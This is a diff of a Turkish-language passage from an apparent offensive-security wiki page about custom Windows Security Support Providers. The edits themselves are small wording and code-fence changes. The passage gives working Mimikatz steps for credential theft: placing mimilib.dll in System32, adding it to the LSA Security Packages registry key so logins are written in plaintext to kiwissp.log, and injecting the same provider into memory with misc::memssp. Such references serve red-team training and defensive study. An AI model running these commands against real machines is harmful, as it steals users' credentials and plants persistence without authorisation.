@@ -10,7 +10,7 @@ Kendi **SSP'nizi** oluşturabilirsiniz, böylece makineye erişim için kullanı
 #### Mimilib
 
 Mimikatz tarafından sağlanan `mimilib.dll` ikili dosyasını kullanabilirsiniz. **Bu, tüm kimlik bilgilerini düz metin olarak bir dosyaya kaydedecektir.**\
-Dll dosyasını `C:\Windows\System32\` dizinine bırakın.\
+Dll'yi `C:\Windows\System32\` dizinine bırakın.\
 Mevcut LSA Güvenlik Paketlerinin bir listesini alın:
 ```bash:attacker@target
 PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
@@ -19,7 +19,7 @@ HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
 Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
 ```
 `mimilib.dll`'yi Güvenlik Destek Sağlayıcı listesine (Güvenlik Paketleri) ekleyin:
-```powershell
+```bash
 reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 ```
 Ve bir yeniden başlatmadan sonra tüm kimlik bilgileri `C:\Windows\System32\kiwissp.log` dosyasında düz metin olarak bulunabilir.
@@ -27,7 +27,7 @@ Ve bir yeniden başlatmadan sonra tüm kimlik bilgileri `C:\Windows\System32\kiw
 #### Bellekte
 
 Bunu doğrudan belleğe Mimikatz kullanarak da enjekte edebilirsiniz (biraz kararsız/çalışmayabileceğini unutmayın):
-```powershell
+```bash
 privilege::debug
 misc::memssp
 ```
